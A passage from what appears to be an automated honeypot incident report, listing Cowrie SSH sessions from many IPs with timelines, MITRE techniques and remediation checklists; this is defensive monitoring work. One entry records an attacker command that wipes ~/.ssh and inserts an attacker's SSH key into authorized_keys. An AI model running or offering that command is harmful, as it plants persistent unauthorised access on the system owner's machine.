| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:43:15` | `cowrie.session.connect` |
| `2026-07-22 06:43:17` | `cowrie.client.version` |
| `2026-07-22 06:43:17` | `cowrie.client.kex` |
| `2026-07-22 06:43:19` | `cowrie.login.success` |
| `2026-07-22 06:43:20` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a5539313cd0

| Field | Detail |
|---|---|
| **Source IP** | `179.184.218[.]49` |
| **First Seen** | 2026-07-22 06:48 |
| **Last Seen** | 2026-07-22 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:48:32` | `cowrie.session.connect` |
| `2026-07-22 06:48:32` | `cowrie.client.version` |
| `2026-07-22 06:48:32` | `cowrie.client.kex` |
| `2026-07-22 06:48:35` | `cowrie.login.success` |
| `2026-07-22 06:48:35` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.218[.]49` to AbuseIPDB if not already reported
- [ ] Block `179.184.218[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6130325ddb3

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-07-22 06:48 |
| **Last Seen** | 2026-07-22 06:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:48:45` | `cowrie.session.connect` |
| `2026-07-22 06:48:46` | `cowrie.client.version` |
| `2026-07-22 06:48:46` | `cowrie.client.kex` |
| `2026-07-22 06:48:48` | `cowrie.login.success` |
| `2026-07-22 06:48:49` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f89952073738

| Field | Detail |
|---|---|
| **Source IP** | `62.201.228[.]210` |
| **First Seen** | 2026-07-22 06:49 |
| **Last Seen** | 2026-07-22 06:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:49:30` | `cowrie.session.connect` |
| `2026-07-22 06:49:31` | `cowrie.client.version` |
| `2026-07-22 06:49:31` | `cowrie.client.kex` |
| `2026-07-22 06:49:32` | `cowrie.login.success` |
| `2026-07-22 06:49:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.228[.]210` to AbuseIPDB if not already reported
- [ ] Block `62.201.228[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c26dcf30f93

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-22 06:49 |
| **Last Seen** | 2026-07-22 06:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:49:37` | `cowrie.session.connect` |
| `2026-07-22 06:49:38` | `cowrie.client.version` |
| `2026-07-22 06:49:38` | `cowrie.client.kex` |
| `2026-07-22 06:49:38` | `cowrie.login.success` |
| `2026-07-22 06:49:39` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a4c3711922e

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:53 |
| **Last Seen** | 2026-07-22 06:54 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:53:59` | `cowrie.session.connect` |
| `2026-07-22 06:54:00` | `cowrie.login.success` |
| `2026-07-22 06:54:00` | `cowrie.session.params` |
| `2026-07-22 06:54:01` | `cowrie.command.input` |
| `2026-07-22 06:54:01` | `cowrie.command.failed` |
| `2026-07-22 06:54:01` | `cowrie.command.input` |
| `2026-07-22 06:54:01` | `cowrie.command.failed` |
| `2026-07-22 06:54:02` | `cowrie.command.input` |
| `2026-07-22 06:54:02` | `cowrie.command.failed` |
| `2026-07-22 06:54:02` | `cowrie.command.input` |
| `2026-07-22 06:54:02` | `cowrie.command.failed` |
| `2026-07-22 06:54:02` | `cowrie.command.input` |
| `2026-07-22 06:54:02` | `cowrie.command.input` |
| `2026-07-22 06:54:02` | `cowrie.command.failed` |
| `2026-07-22 06:54:02` | `cowrie.command.failed` |
| `2026-07-22 06:54:34` | `cowrie.log.closed` |
| `2026-07-22 06:54:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a82b3a5fffe

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:54 |
| **Last Seen** | 2026-07-22 06:55 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:54:34` | `cowrie.session.connect` |
| `2026-07-22 06:54:35` | `cowrie.login.success` |
| `2026-07-22 06:54:35` | `cowrie.session.params` |
| `2026-07-22 06:54:36` | `cowrie.command.input` |
| `2026-07-22 06:54:36` | `cowrie.command.failed` |
| `2026-07-22 06:54:36` | `cowrie.command.input` |
| `2026-07-22 06:54:36` | `cowrie.command.failed` |
| `2026-07-22 06:54:36` | `cowrie.command.input` |
| `2026-07-22 06:54:36` | `cowrie.command.failed` |
| `2026-07-22 06:54:37` | `cowrie.command.input` |
| `2026-07-22 06:54:37` | `cowrie.command.failed` |
| `2026-07-22 06:54:37` | `cowrie.command.input` |
| `2026-07-22 06:54:37` | `cowrie.command.input` |
| `2026-07-22 06:54:37` | `cowrie.command.failed` |
| `2026-07-22 06:54:37` | `cowrie.command.failed` |
| `2026-07-22 06:55:08` | `cowrie.log.closed` |
| `2026-07-22 06:55:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffbc7a52a92a

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:55 |
| **Last Seen** | 2026-07-22 06:55 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:55:08` | `cowrie.session.connect` |
| `2026-07-22 06:55:09` | `cowrie.login.success` |
| `2026-07-22 06:55:09` | `cowrie.session.params` |
| `2026-07-22 06:55:10` | `cowrie.command.input` |
| `2026-07-22 06:55:10` | `cowrie.command.failed` |
| `2026-07-22 06:55:10` | `cowrie.command.input` |
| `2026-07-22 06:55:10` | `cowrie.command.failed` |
| `2026-07-22 06:55:11` | `cowrie.command.input` |
| `2026-07-22 06:55:11` | `cowrie.command.failed` |
| `2026-07-22 06:55:11` | `cowrie.command.input` |
| `2026-07-22 06:55:11` | `cowrie.command.failed` |
| `2026-07-22 06:55:12` | `cowrie.command.input` |
| `2026-07-22 06:55:12` | `cowrie.command.input` |
| `2026-07-22 06:55:12` | `cowrie.command.failed` |
| `2026-07-22 06:55:12` | `cowrie.command.failed` |
| `2026-07-22 06:55:43` | `cowrie.log.closed` |
| `2026-07-22 06:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22bb89ee695

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:55 |
| **Last Seen** | 2026-07-22 06:56 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:55:43` | `cowrie.session.connect` |
| `2026-07-22 06:55:44` | `cowrie.login.success` |
| `2026-07-22 06:55:44` | `cowrie.session.params` |
| `2026-07-22 06:55:45` | `cowrie.command.input` |
| `2026-07-22 06:55:45` | `cowrie.command.failed` |
| `2026-07-22 06:55:45` | `cowrie.command.input` |
| `2026-07-22 06:55:45` | `cowrie.command.failed` |
| `2026-07-22 06:55:45` | `cowrie.command.input` |
| `2026-07-22 06:55:45` | `cowrie.command.failed` |
| `2026-07-22 06:55:46` | `cowrie.command.input` |
| `2026-07-22 06:55:46` | `cowrie.command.failed` |
| `2026-07-22 06:55:46` | `cowrie.command.input` |
| `2026-07-22 06:55:46` | `cowrie.command.input` |
| `2026-07-22 06:55:46` | `cowrie.command.failed` |
| `2026-07-22 06:55:46` | `cowrie.command.failed` |
| `2026-07-22 06:56:17` | `cowrie.log.closed` |
| `2026-07-22 06:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53354a76084

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:56 |
| **Last Seen** | 2026-07-22 06:56 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:56:17` | `cowrie.session.connect` |
| `2026-07-22 06:56:18` | `cowrie.login.success` |
| `2026-07-22 06:56:19` | `cowrie.login.success` |
| `2026-07-22 06:56:19` | `cowrie.session.params` |
| `2026-07-22 06:56:20` | `cowrie.command.input` |
| `2026-07-22 06:56:20` | `cowrie.command.failed` |
| `2026-07-22 06:56:20` | `cowrie.command.input` |
| `2026-07-22 06:56:20` | `cowrie.command.failed` |
| `2026-07-22 06:56:20` | `cowrie.command.input` |
| `2026-07-22 06:56:20` | `cowrie.command.input` |
| `2026-07-22 06:56:20` | `cowrie.command.failed` |
| `2026-07-22 06:56:20` | `cowrie.command.failed` |
| `2026-07-22 06:56:52` | `cowrie.log.closed` |
| `2026-07-22 06:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e955384d0e

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:56 |
| **Last Seen** | 2026-07-22 06:57 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:56:52` | `cowrie.session.connect` |
| `2026-07-22 06:56:53` | `cowrie.login.success` |
| `2026-07-22 06:56:53` | `cowrie.session.params` |
| `2026-07-22 06:56:54` | `cowrie.command.input` |
| `2026-07-22 06:56:54` | `cowrie.command.failed` |
| `2026-07-22 06:56:54` | `cowrie.command.input` |
| `2026-07-22 06:56:54` | `cowrie.command.failed` |
| `2026-07-22 06:56:54` | `cowrie.command.input` |
| `2026-07-22 06:56:54` | `cowrie.command.failed` |
| `2026-07-22 06:56:54` | `cowrie.command.input` |
| `2026-07-22 06:56:54` | `cowrie.command.failed` |
| `2026-07-22 06:56:55` | `cowrie.command.input` |
| `2026-07-22 06:56:55` | `cowrie.command.input` |
| `2026-07-22 06:56:55` | `cowrie.command.failed` |
| `2026-07-22 06:56:55` | `cowrie.command.failed` |
| `2026-07-22 06:57:26` | `cowrie.log.closed` |
| `2026-07-22 06:57:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e31fda84384

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:57 |
| **Last Seen** | 2026-07-22 06:58 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:57:26` | `cowrie.session.connect` |
| `2026-07-22 06:57:27` | `cowrie.login.success` |
| `2026-07-22 06:57:27` | `cowrie.session.params` |
| `2026-07-22 06:57:28` | `cowrie.command.input` |
| `2026-07-22 06:57:28` | `cowrie.command.failed` |
| `2026-07-22 06:57:28` | `cowrie.command.input` |
| `2026-07-22 06:57:28` | `cowrie.command.failed` |
| `2026-07-22 06:57:29` | `cowrie.command.input` |
| `2026-07-22 06:57:29` | `cowrie.command.failed` |
| `2026-07-22 06:57:29` | `cowrie.command.input` |
| `2026-07-22 06:57:29` | `cowrie.command.failed` |
| `2026-07-22 06:57:29` | `cowrie.command.input` |
| `2026-07-22 06:57:29` | `cowrie.command.input` |
| `2026-07-22 06:57:29` | `cowrie.command.failed` |
| `2026-07-22 06:57:29` | `cowrie.command.failed` |
| `2026-07-22 06:58:01` | `cowrie.log.closed` |
| `2026-07-22 06:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0456fd70a6fe

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:58 |
| **Last Seen** | 2026-07-22 06:58 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:58:01` | `cowrie.session.connect` |
| `2026-07-22 06:58:02` | `cowrie.login.success` |
| `2026-07-22 06:58:02` | `cowrie.session.params` |
| `2026-07-22 06:58:03` | `cowrie.command.input` |
| `2026-07-22 06:58:03` | `cowrie.command.failed` |
| `2026-07-22 06:58:03` | `cowrie.command.input` |
| `2026-07-22 06:58:03` | `cowrie.command.failed` |
| `2026-07-22 06:58:04` | `cowrie.command.input` |
| `2026-07-22 06:58:04` | `cowrie.command.failed` |
| `2026-07-22 06:58:04` | `cowrie.command.input` |
| `2026-07-22 06:58:04` | `cowrie.command.failed` |
| `2026-07-22 06:58:04` | `cowrie.command.input` |
| `2026-07-22 06:58:04` | `cowrie.command.input` |
| `2026-07-22 06:58:04` | `cowrie.command.failed` |
| `2026-07-22 06:58:04` | `cowrie.command.failed` |
| `2026-07-22 06:58:36` | `cowrie.log.closed` |
| `2026-07-22 06:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378a099cb989

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:58 |
| **Last Seen** | 2026-07-22 06:59 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:58:36` | `cowrie.session.connect` |
| `2026-07-22 06:58:37` | `cowrie.login.success` |
| `2026-07-22 06:58:38` | `cowrie.login.success` |
| `2026-07-22 06:58:38` | `cowrie.session.params` |
| `2026-07-22 06:58:38` | `cowrie.command.input` |
| `2026-07-22 06:58:38` | `cowrie.command.failed` |
| `2026-07-22 06:58:39` | `cowrie.command.input` |
| `2026-07-22 06:58:39` | `cowrie.command.failed` |
| `2026-07-22 06:58:39` | `cowrie.command.input` |
| `2026-07-22 06:58:39` | `cowrie.command.input` |
| `2026-07-22 06:58:39` | `cowrie.command.failed` |
| `2026-07-22 06:58:39` | `cowrie.command.failed` |
| `2026-07-22 06:59:10` | `cowrie.log.closed` |
| `2026-07-22 06:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab454bfac7d

| Field | Detail |
|---|---|
| **Source IP** | `175.195.238[.]137` |
| **First Seen** | 2026-07-22 06:59 |
| **Last Seen** | 2026-07-22 06:59 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:59:10` | `cowrie.session.connect` |
| `2026-07-22 06:59:11` | `cowrie.login.success` |
| `2026-07-22 06:59:11` | `cowrie.session.params` |
| `2026-07-22 06:59:12` | `cowrie.command.input` |
| `2026-07-22 06:59:12` | `cowrie.command.failed` |
| `2026-07-22 06:59:12` | `cowrie.command.input` |
| `2026-07-22 06:59:12` | `cowrie.command.failed` |
| `2026-07-22 06:59:12` | `cowrie.command.input` |
| `2026-07-22 06:59:12` | `cowrie.command.failed` |
| `2026-07-22 06:59:13` | `cowrie.command.input` |
| `2026-07-22 06:59:13` | `cowrie.command.failed` |
| `2026-07-22 06:59:13` | `cowrie.command.input` |
| `2026-07-22 06:59:13` | `cowrie.command.input` |
| `2026-07-22 06:59:13` | `cowrie.command.failed` |
| `2026-07-22 06:59:13` | `cowrie.command.failed` |
| `2026-07-22 06:59:44` | `cowrie.log.closed` |
| `2026-07-22 06:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.238[.]137` to AbuseIPDB if not already reported
- [ ] Block `175.195.238[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0064f044c5

| Field | Detail |
|---|---|
| **Source IP** | `122.227.103[.]254` |
| **First Seen** | 2026-07-22 07:00 |
| **Last Seen** | 2026-07-22 07:05 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:00:45` | `cowrie.session.connect` |
| `2026-07-22 07:00:46` | `cowrie.client.version` |
| `2026-07-22 07:00:46` | `cowrie.client.kex` |
| `2026-07-22 07:00:47` | `cowrie.login.success` |
| `2026-07-22 07:00:49` | `cowrie.session.params` |
| `2026-07-22 07:00:49` | `cowrie.command.input` |
| `2026-07-22 07:00:49` | `cowrie.command.failed` |
| `2026-07-22 07:00:49` | `cowrie.log.closed` |
| `2026-07-22 07:00:50` | `cowrie.session.params` |
| `2026-07-22 07:00:50` | `cowrie.command.input` |
| `2026-07-22 07:00:50` | `cowrie.session.file_download` |
| `2026-07-22 07:00:50` | `cowrie.log.closed` |
| `2026-07-22 07:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.227.103[.]254` to AbuseIPDB if not already reported
- [ ] Block `122.227.103[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387e4c01c899

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]21` |
| **First Seen** | 2026-07-22 07:04 |
| **Last Seen** | 2026-07-22 07:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:04:30` | `cowrie.session.connect` |
| `2026-07-22 07:04:31` | `cowrie.client.version` |
| `2026-07-22 07:04:31` | `cowrie.client.kex` |
| `2026-07-22 07:04:33` | `cowrie.login.success` |
| `2026-07-22 07:04:33` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:04:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]21` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d8e18912b2f

| Field | Detail |
|---|---|
| **Source IP** | `103.230.176[.]152` |
| **First Seen** | 2026-07-22 07:07 |
| **Last Seen** | 2026-07-22 07:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:07:58` | `cowrie.session.connect` |
| `2026-07-22 07:07:59` | `cowrie.client.version` |
| `2026-07-22 07:07:59` | `cowrie.client.kex` |
| `2026-07-22 07:08:01` | `cowrie.login.success` |
| `2026-07-22 07:08:01` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:08:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.230.176[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.230.176[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f61a25ef25

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-07-22 07:08 |
| **Last Seen** | 2026-07-22 07:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:08:34` | `cowrie.session.connect` |
| `2026-07-22 07:08:35` | `cowrie.client.version` |
| `2026-07-22 07:08:35` | `cowrie.client.kex` |
| `2026-07-22 07:08:36` | `cowrie.login.success` |
| `2026-07-22 07:08:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d534b6f8151d

| Field | Detail |
|---|---|
| **Source IP** | `103.112.224[.]81` |
| **First Seen** | 2026-07-22 07:08 |
| **Last Seen** | 2026-07-22 07:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:08:42` | `cowrie.session.connect` |
| `2026-07-22 07:08:42` | `cowrie.client.version` |
| `2026-07-22 07:08:42` | `cowrie.client.kex` |
| `2026-07-22 07:08:44` | `cowrie.login.success` |
| `2026-07-22 07:08:45` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.112.224[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.112.224[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3cb24db2dec

| Field | Detail |
|---|---|
| **Source IP** | `203.150.140[.]229` |
| **First Seen** | 2026-07-22 07:09 |
| **Last Seen** | 2026-07-22 07:10 |
| **Session Duration** | 79s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
